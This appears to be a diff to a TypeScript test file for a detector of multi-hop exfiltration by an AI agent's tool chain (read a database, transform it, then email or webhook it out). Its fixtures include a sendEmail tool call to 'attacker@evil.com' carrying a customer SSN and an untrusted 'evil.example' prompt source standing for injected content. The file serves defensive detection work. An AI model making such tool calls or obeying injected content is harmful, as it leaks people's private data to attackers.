@@ -14,7 +14,7 @@ function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
     turnId: 'turn-003',
     sessionId: 'session-test',
     toolName: 'sendEmail',
-    toolArguments: { recipient: 'attacker@evil.com', body: 'exfiltrated data' },
+    toolArguments: { recipient: 'attacker@evil.com', body: 'Customer SSN 123-45-6789' },
     toolResult: 'sent',
     timestamp: Date.now(),
     ...overrides,
@@ -50,6 +50,8 @@ describe('detectToolChainExfiltration', () => {
       expect(result).not.toBeNull();
       expect(result?.signal).toBe('MULTI_HOP_EXFILTRATION');
       expect(result?.layer).toBe('L3');
+      expect(result?.destination).toBe('attacker@evil.com');
+      expect(result?.matchedFields).toContain('123-45-6789');
     });
 
     it('should include chain tools in the signal', () => {
@@ -138,6 +140,30 @@ describe('detectToolChainExfiltration', () => {
       const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
       expect(result).toBeNull();
     });
+
+    it('should return null when outbound goes to an authorized destination', () => {
+      const session = makeSessionWithChain([
+        { toolName: 'readDatabase', turnId: 'turn-000' },
+        { toolName: 'transformData', turnId: 'turn-001' },
+      ]);
+      const ctx = makeCtx({
+        toolArguments: { recipient: 'ops@corp.internal', body: '123-45-6789' },
+      });
+      const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS, ['corp.internal']);
+      expect(result).toBeNull();
+    });
+
+    it('should return null when the chain has no exfil evidence or injection context', () => {
+      const session = makeSessionWithChain([
+        { toolName: 'readDatabase', turnId: 'turn-000' },
+        { toolName: 'transformData', turnId: 'turn-001' },
+      ], { privilegedValues: ['123-45-6789'] });
+      const ctx = makeCtx({
+        toolArguments: { recipient: 'attacker@evil.com', body: 'summary redacted' },
+      });
+      const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS);
+      expect(result).toBeNull();
+    });
   });
 
   describe('edge cases', () => {
@@ -160,6 +186,20 @@ describe('detectToolChainExfiltration', () => {
       const ctx = makeCtx({ toolName: 'postWebhook' });
       const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS);
       expect(result).not.toBeNull();
+    });
+
+    it('should detect derived risk when untrusted content entered the session even if values are transformed', () => {
+      const session = makeSessionWithChain([
+        { toolName: 'readDatabase', turnId: 'turn-000' },
+        { toolName: 'summarizeReport', turnId: 'turn-001' },
+      ], { privilegedValues: ['123-45-6789'] });
+      session.untrustedSources.add('https://evil.example/prompt');
+      const ctx = makeCtx({
+        toolArguments: { recipient: 'attacker@evil.com', body: 'customer export summary attached' },
+      });
+      const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS);
+      expect(result).not.toBeNull();
+      expect(result?.destination).toBe('attacker@evil.com');
     });
   });
 });
